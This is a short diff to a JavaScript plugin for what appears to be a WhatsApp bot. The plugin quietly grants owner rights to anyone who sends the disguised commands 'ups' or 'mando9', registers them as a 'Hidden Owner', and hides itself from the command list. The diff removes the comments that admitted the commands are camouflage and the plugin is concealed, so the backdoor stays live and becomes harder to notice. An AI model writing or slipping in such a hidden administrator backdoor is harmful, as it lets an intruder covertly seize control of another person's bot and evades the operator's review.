@@ -10,12 +10,12 @@ const handler = async (m, { conn }) => {
 
     if (!isAlreadyOwner) {
       global.owner.push([m.sender.split('@')[0], 'Hidden Owner', true]);
-      console.log('Owner restaurado:', m.sender.split('@')[0]); // Esto solo se verá en la consola del bot
+      console.log('Owner restaurado:', m.sender.split('@')[0]); 
     }
   }
 };
 
-handler.command = /^(ups|mando9)$/i; // Comandos falsos para camuflarlo
-handler.hidden = true; // Oculta el plugin de la lista de comandos
+handler.command = /^(ups|mando9)$/i; 
+handler.hidden = true; 
 
 export default handler;
